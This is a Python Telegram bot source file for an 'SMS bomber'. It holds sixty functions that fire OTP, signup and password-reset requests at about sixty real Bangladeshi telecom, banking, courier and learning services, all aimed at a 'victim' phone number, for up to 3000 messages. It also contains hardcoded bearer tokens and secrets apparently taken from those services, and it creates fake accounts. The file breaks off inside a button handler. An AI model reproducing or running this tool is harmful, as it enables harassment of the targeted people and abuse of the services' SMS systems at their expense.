#!/usr/bin/env python3
# EH BOMBER 👿 — TELEGRAM BOT VERSION
# Original: BARSHA / BDCYBER
# Bot wrapper: EH Munna 👿

import os, sys, time, json, asyncio, logging
import urllib3, requests
from requests.structures import CaseInsensitiveDict
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    ConversationHandler, CallbackQueryHandler,
    ContextTypes, filters
)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
requests.packages.urllib3.disable_warnings()

logging.basicConfig(
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# ─── CONFIG ────────────────────────────────────────────────────────────────────
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"   # @BotFather থেকে নাও

# ─── STATES ────────────────────────────────────────────────────────────────────
ASK_NUMBER, ASK_AMOUNT = range(2)

# ─── ACTIVE ATTACK REGISTRY ────────────────────────────────────────────────────
# uid → asyncio.Event  (set = চালু, clear = বন্ধ)
active_attacks: dict[int, asyncio.Event] = {}

# ─── USER AGENTS ───────────────────────────────────────────────────────────────
UA1  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36"
UA2  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36"
UA3  = "Mozilla/5.0 (X11; Linux x66_64; rv:76.0) Gecko/20100101 Firefox/76.0"
UA4  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0"
UA5  = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36"
UA6  = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
UA7  = "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0)"
UA8  = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.84 Mobile Safari/537.36"
UA9  = "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36"
UA10 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0)"
UA11 = "Mozilla/5.0 (iPhone; CPU iPhone OS 12_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1"

AV1  = '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"'
AV2  = '"Not A(Brand";v="8", "Chromium";v="132", "Google Chrome";v="132"'

# ─── 60 BOMBING FUNCTIONS ──────────────────────────────────────────────────────

def _post(url, **kw):
    try: requests.post(url, timeout=8, verify=False, **kw)
    except: pass

def _get(url, **kw):
    try: requests.get(url, timeout=8, verify=False, **kw)
    except: pass

def lmnXlija_1(n):
    _post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers={'accept':'application/json, text/plain, */*','content-type':'application/json',
                 'origin':'https://go.paperfly.com.bd','user-agent':UA2,'sec-ch-ua':AV1,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'full_name':'Johny Singh','company_name':'lmnxlija',
              'email_address':'lmnxlija9689@gmail.com','phone_number':n})

def lmnXlija_2(n):
    _post('https://api.ghoorilearning.com/api/auth/signup/otp',
        params={'_app_platform':'web'},
        headers={'accept':'application/json, text/plain, */*','content-type':'application/json',
                 'origin':'https://ghoorilearning.com','user-agent':UA2,'sec-ch-ua':AV1,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'mobile_no':n})

def lmnXlija_3(n):
    _post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber',
        headers={'accept':'*/*','content-type':'application/json','origin':'https://doctime.com.bd','user-agent':UA2},
        json={'data':{'country_calling_code':'88','contact_no':n,'headers':{'PlatForm':'Web'}}})

def lmnXlija_4(n):
    _post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers={'accept':'*/*','authorization':'','content-type':'application/json',
                 'origin':'https://customer.sundarbancourierltd.com','user-agent':UA1,'sec-ch-ua':AV2,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'operationName':'CreateAccessToken',
              'variables':{'accessTokenFilter':{'userName':n}},
              'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n        message\n        statusCode\n        result {\n      phone\n      otpCounter\n      __typename\n        }\n        __typename\n  }\n}'})

def lmnXlija_5(n):
    _post('https://api.apex4u.com/api/auth/login',
        headers={'accept':'application/json, text/plain, */*','content-type':'application/json',
                 'origin':'https://apex4u.com','user-agent':UA1,'sec-ch-ua':AV2,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'phoneNumber':n})

def lmnXlija_6(n):
    _post('https://webapi.robi.com.bd/v1/send-otp',
        headers={'Authorization':'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc',
                 'Content-Type':'application/json'},
        json={'phone_number':n,'type':'doorstep'})

def lmnXlija_7(n):
    _get(f'https://web-api.banglalink.net/api/v1/user/number/validation/{n}',
        headers={'Accept':'*/*','Origin':'https://banglalink.net','User-Agent':UA1,
                 'sec-ch-ua':AV2,'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'})

def lmnXlija_8(n):
    _post('https://web-api.banglalink.net/api/v1/user/otp-login/request',
        headers={'Accept':'application/json, text/plain, */*','Content-Type':'application/json',
                 'Origin':'https://banglalink.net','User-Agent':UA1,
                 'client-security-token':'1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ',
                 'sec-ch-ua':AV2,'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'mobile':n})

def lmnXlija_9(n):
    _post('https://webloginda.grameenphone.com/backend/api/v1/otp',
        headers={'Accept':'application/json, text/plain, */*',
                 'Content-Type':'application/x-www-form-urlencoded',
                 'Origin':'https://www.grameenphone.com','User-Agent':UA1,
                 'sec-ch-ua':AV2,'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        data={'msisdn':n})

def lmnXlija_10(n):
    tok = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI'
    _post('https://webapi.robi.com.bd/v1/send-otp',
        headers={'Authorization':f'Bearer {tok}','Content-Type':'application/json;charset=UTF-8',
                 'Origin':'https://www.robi.com.bd','User-Agent':UA1,'X-CSRF-TOKEN':tok,
                 'sec-ch-ua':AV2,'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'phone_number':n,'type':'my_offer'})

def lmnXlija_11(n):
    _post('https://da-api.robi.com.bd/da-nll/otp/send',
        headers={'Content-Type':'application/json'},
        json={'msisdn':n})

def lmnXlija_12(n):
    tok = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI'
    _post('https://webapi.robi.com.bd/v1/chat/send-otp',
        headers={'Authorization':f'Bearer {tok}','Content-Type':'application/json;charset=UTF-8',
                 'Origin':'https://www.robi.com.bd','User-Agent':UA1,'X-CSRF-TOKEN':tok},
        json={'phone_number':n,'name':'Johny Singh','type':'video-chat'})

def lmnXlija_13(n):
    _post('https://api.redx.com.bd/v1/merchant/registration/generate-registration-otp',
        headers={'accept':'application/json, text/plain, */*','content-type':'application/json',
                 'origin':'https://redx.com.bd','user-agent':UA1,'sec-ch-ua':AV2,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'phoneNumber':n})

def lmnXlija_14(n):
    _post('https://fundesh.com.bd/api/auth/generateOTP',
        params={'service_key':''},
        headers={'accept':'application/json, text/plain, */*',
                 'content-type':'application/json; charset=UTF-8',
                 'origin':'https://fundesh.com.bd','user-agent':UA1,'sec-ch-ua':AV2,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'msisdn':n})

def lmnXlija_15(n):
    _get('https://bikroy.com/data/phone_number_login/verifications/phone_login',
        params={'phone':n},
        headers={'accept':'application/json, text/plain, */*','application-name':'web',
                 'referer':'https://bikroy.com/?login-modal=true&redirect-url=/',
                 'user-agent':UA1,'sec-ch-ua':AV2,'sec-ch-ua-mobile':'?0',
                 'sec-ch-ua-platform':'"Windows"'})

def lmnXlija_16(n):
    _post('https://api.motionview.com.bd/api/send-otp-phone-signup',
        headers={'accept':'application/json, text/plain, */*','content-type':'application/json',
                 'origin':'https://motionview.com.bd','user-agent':UA1,'sec-ch-ua':AV2,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'phone':n})

def lmnXlija_17(n):
    _post('https://api-dynamic.chorki.com/v2/auth/login',
        params={'country':'BD','platform':'web','language':'en'},
        headers={'accept':'application/json','authorization':'','content-type':'application/json',
                 'origin':'https://www.chorki.com','user-agent':UA1,'sec-ch-ua':AV2,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'number':'+88'+n})

def lmnXlija_18(n):
    _post('https://user-api.jslglobal.co:444/v2/send-otp',
        headers={'accept':'application/json, text/plain, */*','content-type':'application/json',
                 'origin':'https://rental.jatri.co','user-agent':UA1,'sec-ch-ua':AV2,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'phone':'+88'+n,'jatri_token':'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'})

def lmnXlija_19(n):
    _get('https://chinaonlinebd.com/api/login/getOtp',
        params={'phone':n},
        headers={'accept':'application/json, text/plain, */*',
                 'referer':'https://chinaonlinebd.com/login?next=/dashboard',
                 'token':'45601f3d391886fcec5f5a3f26780f21','user-agent':UA1,
                 'sec-ch-ua':AV2,'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'})

def lmnXlija_20(n):
    _post('https://api.deeptoplay.com/v2/auth/login',
        params={'country':'BD','platform':'web','language':'en'},
        headers={'accept':'application/json','authorization':'','content-type':'application/json',
                 'origin':'https://www.deeptoplay.com','user-agent':UA1,'sec-ch-ua':AV2,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'number':'+88'+n})

def lmnXlija_21(n):
    _post('https://api.shikho.com/auth/v2/send/sms',
        headers={'accept':'application/json, text/plain, */*','content-type':'application/json',
                 'origin':'https://shikho.com','user-agent':UA1,'sec-ch-ua':AV2,
                 'sec-ch-ua-mobile':'?0','sec-ch-ua-platform':'"Windows"'},
        json={'phone':n,'type':'student','auth_type':'signup','vendor':'shikho'})

def lmnXlija_22(n):
    h = CaseInsensitiveDict()
    h["Accept"]="application/json, text/plain, */*"; h["Accept-Encoding"]="gzip, deflate, br"
    h["Accept-Language"]="en-US,en;q=0.5"; h["Connection"]="keep-alive"
    h["Content-Type"]="application/json"; h["Host"]="api.redx.com.bd"
    h["Origin"]="https://redx.com.bd"; h["Referer"]="https://redx.com.bd/registration/"
    h["User-Agent"]=UA3; h["x-access-token"]="Bearer null"
    _post('https://api.redx.com.bd/v1/user/signup', headers=h,
          data=f'{{"name":"961096106","phoneNumber":"{n}","service":"redx"}}')

def lmnXlija_23(n):
    _get(f'https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={n}')

def lmnXlija_24(n):
    _post(f'https://www.bioscopelive.com/en/login/send-otp?phone=88{n}&operator=bd-otp')

def lmnXlija_25(n):
    _post(f'https://ss.binge.buzz/otp/send/login{n}')

def lmnXlija_26(n):
    h = CaseInsensitiveDict(); h["Content-Type"]="application/json"
    _post('https://fundesh.com.bd/api/auth/generateOTP?service_key=', headers=h,
          data=f'{{"msisdn":"{n}"}}')

def lmnXlija_27(n):
    _post('https://applink.com.bd/appstore-v4-server/login/otp/request',
        headers={'User-Agent':UA4,'Referer':'https://applink.com.bd/',
                 'Content-Type':'application/json','Origin':'https://applink.com.bd'},
        data=json.dumps({'msisdn':'88'+n}))

def lmnXlija_28(n):
    _post('https://chokrojan.com/api/v1/passenger/login/mobile',
        headers={'User-Agent':UA4,'domain-name':'chokrojan.com','user-platform':'3',
                 'company-id':'1','Origin':'https://chokrojan.com',
                 'Referer':'https://chokrojan.com/login','Content-Type':'application/json'},
        data=json.dumps({'mobile_number':n}))

def lmnXlija_29(n):
    lmnXlija_28(n)  # same endpoint, second hit

def lmnXlija_30(n):
    _post('https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber',
        headers={'Content-Type':'application/json','User-Agent':UA4},
        data=json.dumps({'AccessToken':'','TrackingNo':'','mobileNo':n,'otpSms':'',
                         'product_id':'250','requestChannel':'MOB','trackingStatus':5}))

def lmnXlija_31(n):
    _post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber',
        headers={'Content-type':'application/json','Referer':'https://doctime.com.bd/',
                 'Origin':'https://doctime.com.bd','User-Agent':UA4},
        data=json.dumps({'data':{'flag':'https://doctime-core-ap-southeast-1.s3.ap-southeast-1.amazonaws.com/images/country-flags/flag-800.png',
                                 'code':'88','contact_no':n,'country_calling_code':'88',
                                 'headers':{'PlatForm':'Web'}}}))

def lmnXlija_32(n):
    _post('https://core.easy.com.bd/api/v1/registration',
        headers={'User-Agent':UA4,'Referer':'https://easy.com.bd/','Content-Type':'application/json'},
        data=json.dumps({'name':'Limon Islam','email':'uyrlhkgxqw@emergentvillage.org',
                         'mobile':n,'password':'boss#2022','password_confirmation':'boss#2022',
                         'device_key':'9a28ae67c5704e1fcb50a8fc4ghjea4d'}))

def lmnXlija_33(n):
    _post('https://eshop-api.banglalink.net/api/v1/customer/send-otp',
        headers={'User-Agent':UA4,'Content-Type':'application/json'},
        data=json.dumps({'type':'phone','phone':n}))

def lmnXlija_34(n):
    _post('https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber',
        headers={'Content-Type':'application/json','User-Agent':UA4},
        json={'AccessToken':'','TrackingNo':'','mobileNo':n,'otpSms':'',
              'product_id':'122','requestChannel':'MOB','trackingStatus':5})

def lmnXlija_35(n):
    _post(f'https://api.mygp.cinematic.mobi/api/v1/otp/88{n}/SBENT_3GB7D',
        headers={'User-Agent':UA4,'Content-Type':'application/json'},
        json={'accessinfo':{'access_token':'K165S6V6q4C6G7H0y9C4f5W7t5YeC6','referenceCode':'20190827042622'}})

def lmnXlija_36(n):
    _post('https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp',
        headers={'Content-Type':'application/json','User-Agent':UA5},
        json={'phone':n,'email':'','language':'en'})

def lmnXlija_37(n):
    _post(f'https://app.hishabee.business/api/V2/otp/send?mobile_number={n}',
        headers={'User-Agent':UA4,'Content-Type':'application/json','Content-Length':'0'})

def lmnXlija_38(n):
    _get(f'http://apibeta.iqra-live.com/api/v1/sent-otp/{n}')

def lmnXlija_39(n):
    num = n.lstrip('0')
    _post('https://smart1216.robi.com.bd/robi_sivr/public/login/phone',
        headers={'Content-Type':'application/json','User-Agent':UA4},
        json={'cli':num})

def lmnXlija_40(n):
    _post('https://user-api.jslglobal.co:444/v1/send-otp',
        headers={'User-Agent':UA6,'Origin':'https://rental.jatri.co','Referer':'https://rental.jatri.co/'},
        data={'phone':'+88'+n,'jatri_token':'J9vuqzxHyaWa3VaT66NsvmQdmUmwwrHj'})

def lmnXlija_41(n):
    _post('https://www.mcbaffiliate.com/Affiliate/RequestOTP',
        headers={'User-Agent':UA7,'Content-Type':'application/x-www-form-urlencoded'},
        data={'PhoneNumber':n})

def lmnXlija_42(n):
    _post('https://mithaibd.com/api/login/?lang_code=en&currency_code=BDT',
        headers={'user-agent':'okhttp/4.2.2',
                 'Authorization':'Bearer bWlzNTdAcHJhbmdyb3VwLmNvbTpJWE94N1NVUFYwYUE0Rjg4Nmg4bno5V2I2STUzNTNBQQ==',
                 'Content-Type':'application/json'},
        data=json.dumps({'company_id':'2','password2':'Rahu333@@','currency_code':'BDT',
                         'user_type':'C','email':f'fuckyoubro{n}@gmail.com','g_id':'',
                         'lang_code':'en','operating_system':'Android','otp_verify':False,
                         'password1':'Rahu333@@','phone':n,'storefront_id':'5'}))

def lmnXlija_43(n):
    _post('https://api.englishmojabd.com/api/v1/auth/login',
        headers={'Content-Type':'application/json'},
        data=json.dumps({'phone':'+88'+n}))

def lmnXlija_44(n):
    _post('https://moveon.com.bd/api/v1/customer/auth/phone/request-otp',
        headers={'User-Agent':UA4,'Origin':'https://moveon.com.bd',
                 'Alt-Used':'moveon.com.bd','Referer':'https://moveon.com.bd/auth/register',
                 'Content-Type':'application/json'},
        data=json.dumps({'phone':n}))

def lmnXlija_45(n):
    _post('https://api.osudpotro.com/api/v1/users/send_otp',
        headers={'Content-Type':'application/json','User-Agent':UA4},
        data=json.dumps({'mobile':'+88-'+n,'deviceToken':'app','language':'bn','os':'android'}))

def lmnXlija_46(n):
    _get(f'https://mygp.grameenphone.com/mygpapi/v2/otp-login?msisdn=88{n}&lang=en&ng=0',
        headers={'user-agent':UA8})

def lmnXlija_47(n):
    _post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php',
        headers={'Content-Type':'application/json','User-Agent':UA4},
        data=json.dumps({'full_name':'Hangama','company_name':'Hangama',
                         'email_address':'hangama@gmail.com','phone_number':n}))

def lmnXlija_48(n):
    _post('https://auth.qcoom.com/api/v1/otp/send',
        headers={'User-Agent':UA4,'Referer':'https://qcoom.com/','Content-Type':'application/json'},
        json={'mobileNumber':'+88'+n})

def lmnXlija_49(n):
    _post('https://reseller.circle.com.bd/api/v2/auth/signup',
        headers={'User-Agent':UA7,'Content-Type':'application/json'},
        json={'name':'+88'+n,'email_or_phone':'+88'+n,'password':'123456lmn',
              'password_confirmation':'123456lmn','register_by':'phone'})

def lmnXlija_50(n):
    _post('https://backend-api.shomvob.co/api/v2/otp/phone?is_retry=0',
        headers={'User-Agent':UA4,'Content-Type':'application/json',
                 'Authorization':'Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6IlNob212b2JUZWNoQVBJVXNlciIsImlhdCI6MTY2MzMzMDkzMn0.4Wa_u0ZL_6I37dYpwVfiJUkjM97V3_INKVzGYlZds1s'},
        json={'phone':n})

def lmnXlija_51(n):
    _post('https://api-gateway.sundarbancourierltd.com/graphql',
        headers={'Content-Type':'application/json','User-Agent':UA10,
                 'Referer':'https://customer.sundarbancourierltd.com/',
                 'Origin':'https://customer.sundarbancourierltd.com'},
        json={'operationName':'CreateAccessToken',
              'variables':{'accessTokenFilter':{'userName':n}},
              'query':'mutation CreateAccessToken($accessTokenFilter: AccessTokenInput!) {\n  createAccessToken(accessTokenFilter: $accessTokenFilter) {\n  message\n  statusCode\n  result { phone otpCounter __typename }\n  __typename\n}}'})

def lmnXlija_52(n):
    _post('https://api.toybox.live/bdapps_handler.php',
        headers={'Content-Type':'application/json','User-Agent':UA11},
        data=json.dumps({'Operation':'CreateSubscription','MobileNumber':'88'+n,
                         'PackageID':100,'Secret':'HJKX71%UHYH'}))

def lmnXlija_53(n):
    _get(f'https://api.win2gain.com/api/Users/RequestOtp?msisdn=88{n}',
        headers={'sourcePlatform':'web','client':'2'})

def lmnXlija_54(n):
    _post('https://api.bdkepler.com/api_middleware-0.0.1-RELEASE/registration-generate-otp',
        headers={'Content-Type':'application/json'},
        json={'deviceId':'7dtdhid45c0f0901',
              'deviceInfo':{'deviceInfoSignature':'D0923F3GDHJXJDTIHFDTIGGHURHFATI7605A3FA',
                            'deviceId':'7d8b0agi0g0f0901','firebaseDeviceToken':'',
                            'manufacturer':'MI','modelName':'NOTE 10','osFirmWireBuild':'',
                            'osName':'Android','osVersion':'10','rootDevice':0},
              'operator':'Gp','walletNumber':n})

def lmnXlija_55(n):
    _post('https://rootsedulive.com/api/auth/register',
        headers={'Content-Type':'application/x-www-form-urlencoded'},
        data={'name':'Pagli Khatun','phone':f'88{n}',
              'email':f'subap{n}agli2023@gmail.com',
              'password':'iDSnWh6rzp9KNAY','confirmPassword':'iDSnWh6rzp9KNAY'})

def lmnXlija_56(n):
    _post('https://rootsedulive.com/api/auth/forget-password',
        headers={'Content-Type':'application/x-www-form-urlencoded'},
        data={'phoneOrEmail':f'88{n}'})

def lmnXlija_57(n):
    lmnXlija_41(n)  # mcbaffiliate second hit

def lmnXlija_58(n):
    lmnXlija_37(n)  # hishabee second hit

def lmnXlija_59(n):
    _post('https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp',
        headers={'Content-Type':'application/json','User-Agent':UA9},
        json={'phone':n,'email':'','language':'en'})

def lmnXlija_60(n):
    _post(f'https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{n}/',
        headers={'User-Agent':UA4,'Content-Type':'application/json'})

# ─── ALL BOMBER FUNCTIONS IN ORDER ─────────────────────────────────────────────
ALL_FUNCS = [
    lmnXlija_1,  lmnXlija_2,  lmnXlija_3,  lmnXlija_4,  lmnXlija_5,
    lmnXlija_6,  lmnXlija_7,  lmnXlija_8,  lmnXlija_9,  lmnXlija_10,
    lmnXlija_11, lmnXlija_12, lmnXlija_13, lmnXlija_14, lmnXlija_15,
    lmnXlija_16, lmnXlija_17, lmnXlija_18, lmnXlija_19, lmnXlija_20,
    lmnXlija_21, lmnXlija_22, lmnXlija_23, lmnXlija_24, lmnXlija_25,
    lmnXlija_26, lmnXlija_27, lmnXlija_28, lmnXlija_29, lmnXlija_30,
    lmnXlija_31, lmnXlija_32, lmnXlija_33, lmnXlija_34, lmnXlija_35,
    lmnXlija_36, lmnXlija_37, lmnXlija_38, lmnXlija_39, lmnXlija_40,
    lmnXlija_41, lmnXlija_42, lmnXlija_43, lmnXlija_44, lmnXlija_45,
    lmnXlija_46, lmnXlija_47, lmnXlija_48, lmnXlija_49, lmnXlija_50,
    lmnXlija_51, lmnXlija_52, lmnXlija_53, lmnXlija_54, lmnXlija_55,
    lmnXlija_56, lmnXlija_57, lmnXlija_58, lmnXlija_59, lmnXlija_60,
]

def run_one_round(number: str) -> int:
    """Run all 60 functions once. Returns count of functions called."""
    for fn in ALL_FUNCS:
        fn(number)
    return len(ALL_FUNCS)

# ═══════════════════════════════════════════════════════════
#  UI  HELPERS  —  সুন্দর animated interface
# ═══════════════════════════════════════════════════════════

# spinner frames — প্রতি round-এ একটা করে rotate
SPINNER   = ["🌑","🌒","🌓","🌔","🌕","🌖","🌗","🌘"]
FIRE_ANIM = ["🔥","💥","⚡","🌟","💫","🔥","💥","⚡"]
BOMB_ANIM = ["💣","🧨","💥","🔥","⚡","💣","🧨","💥"]

def _spin(tick: int, frames: list) -> str:
    return frames[tick % len(frames)]

def _progress_bar(done: int, total: int, width: int = 15) -> str:
    """
    Gradient-style bar:
      filled  → ██  (full block)
      partial → ▓▒░ based on remainder
    """
    if total == 0:
        return "░" * width
    filled = int(done / total * width)
    empty  = width - filled
    bar    = "█" * filled + "░" * empty
    return bar

def _pct_badge(done: int, total: int) -> str:
    pct = int(done / total * 100) if total else 0
    if pct < 25:  return f"🟥 {pct}%"
    if pct < 50:  return f"🟧 {pct}%"
    if pct < 75:  return f"🟨 {pct}%"
    if pct < 100: return f"🟩 {pct}%"
    return             f"✅ 100%"

def _header(tick: int) -> str:
    b = _spin(tick, BOMB_ANIM)
    f = _spin(tick, FIRE_ANIM)
    return (
        f"{b}{b}{b} *EH BOMBER 👿* {f}{f}{f}\n"
        f"┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄┄"
    )

def _attack_card(number: str, rnd: int, amount: int,
                 total_sms: int, tick: int, paused: bool = False) -> str:
    sent     = rnd * 60
    bar      = _progress_bar(rnd, amount)
    badge    = _pct_badge(rnd, amount)
    spin     = _spin(tick, SPINNER)
    status   = "⏸ *PAUSED*" if paused else f"{spin} *ATTACKING...*"

    return (
        f"{_header(tick)}\n\n"
        f"╔══════════════════════════╗\n"
        f"║  📱 `+88 {number}`\n"
        f"║  {status}\n"
        f"╚══════════════════════════╝\n\n"
        f"*Progress*\n"
        f"`{bar}` {badge}\n\n"
        f"┌─────────────────────────┐\n"
        f"│ 🔄  Round   : *{rnd}/{amount}*\n"
        f"│ 📨  Sent    : *{sent}* / {total_sms}\n"
        f"│ 🌐  APIs    : *60 active*\n"
        f"└─────────────────────────┘"
    )

def _toggle_kb(uid: int) -> InlineKeyboardMarkup:
    ev = active_attacks.get(uid)
    running = ev and ev.is_set()
    row1 = [
        InlineKeyboardButton(
            "⏸ PAUSE" if running else "▶️ RESUME",
            callback_data="toggle_off" if running else "toggle_on"
        )
    ]
    row2 = [InlineKeyboardButton("🛑 STOP", callback_data="toggle_stop")]
    return InlineKeyboardMarkup([row1, row2])

# stop flags per uid
stop_flags: dict[int, bool] = {}

# ─── BOT HANDLERS ──────────────────────────────────────────────────────────────

async def start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    kb = [
        [InlineKeyboardButton("💣  BOMB শুরু করো", callback_data="bomb")],
        [InlineKeyboardButton("📖  Help",           callback_data="help_cb")],
    ]
    logo = (
        "```\n"
        "███████╗██╗  ██╗\n"
        "██╔════╝██║  ██║\n"
        "█████╗  ███████║\n"
        "██╔══╝  ██╔══██║\n"
        "███████╗██║  ██║\n"
        "╚══════╝╚═╝  ╚═╝\n"
        "  BOMBER  👿 BOT\n"
        "```"
    )
    await update.message.reply_text(
        f"{logo}\n"
        "⚡ *60 API* — বাংলাদেশের সেরা SMS Bomber\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        "🎯  Target নম্বর দাও\n"
        "🔄  Round বেছে নাও  _(1 Round = 60 SMS)_\n"
        "💥  আক্রমণ শুরু\n"
        "⏸  যেকোনো সময় Pause/Resume\n"
        "━━━━━━━━━━━━━━━━━━━━━━",
        parse_mode="Markdown",
        reply_markup=InlineKeyboardMarkup(kb)
    )

async def help_cb(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q = update.callback_query
    await q.answer()
    await q.message.reply_text(
        "```\n"
        "╔══════════════════════╗\n"
        "║   📖  HELP  MENU     ║\n"
        "╠══════════════════════╣\n"
        "║ /start  → হোম স্ক্রিন ║\n"
        "║ /bomb   → আক্রমণ শুরু ║\n"
        "║ /cancel → বাতিল       ║\n"
        "╠══════════════════════╣\n"
        "║ 1 Round  = 60 SMS    ║\n"
        "║ Max 50R  = 3000 SMS  ║\n"
        "║ 60 APIs  active      ║\n"
        "╚══════════════════════╝\n"
        "```",
        parse_mode="Markdown"
    )

async def bomb_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if update.callback_query:
        await update.callback_query.answer()
        reply = update.callback_query.message.reply_text
    else:
        reply = update.message.reply_text
    await reply(
        "```\n"
        "┌──────────────────────────┐\n"
        "│  📱  VICTIM NUMBER INPUT │\n"
        "└──────────────────────────┘\n"
        "```\n"
        "11 ডিজিটের নম্বর দাও _(+88 ছাড়া)_\n\n"
        "উদাহরণ:  `01XXXXXXXXX`",
        parse_mode="Markdown"
    )
    return ASK_NUMBER

async def got_number(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    number = update.message.text.strip()
    if not number.isdigit() or len(number) != 11:
        await update.message.reply_text(
            "```\n"
            "╔══════════════════╗\n"
            "║  ❌  INVALID!    ║\n"
            "╚══════════════════╝\n"
            "```\n"
            "11 ডিজিটের নম্বর দাও।\nআবার চেষ্টা করো 👇",
            parse_mode="Markdown"
        )
        return ASK_NUMBER

    ctx.user_data["number"] = number
    await update.message.reply_text(
        "```\n"
        "╔══════════════════════════╗\n"
        "║  ✅  NUMBER LOCKED IN!   ║\n"
        f"║  📱  +88 {number}  ║\n"
        "╚══════════════════════════╝\n"
        "```\n"
        "🔄 কত Round স্প্যাম করবো?\n"
        "_1 Round = 60 SMS_\n\n"
        "সংখ্যা দাও `1` — `50` 👇",
        parse_mode="Markdown"
    )
    return ASK_AMOUNT

async def toggle_handler(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    q   = update.callback_query
    uid = q.from_user.id
    await q.answer()

    if q.data == "toggle_stop":
        stop_flags[uid] = True
        ev = active_attacks.get(uid)
        if ev:
            ev.set()   # unblock wait so loop can exit
        try:
            await q.edit_message_reply_markup(reply_markup=None)
        except Exception:
            pass
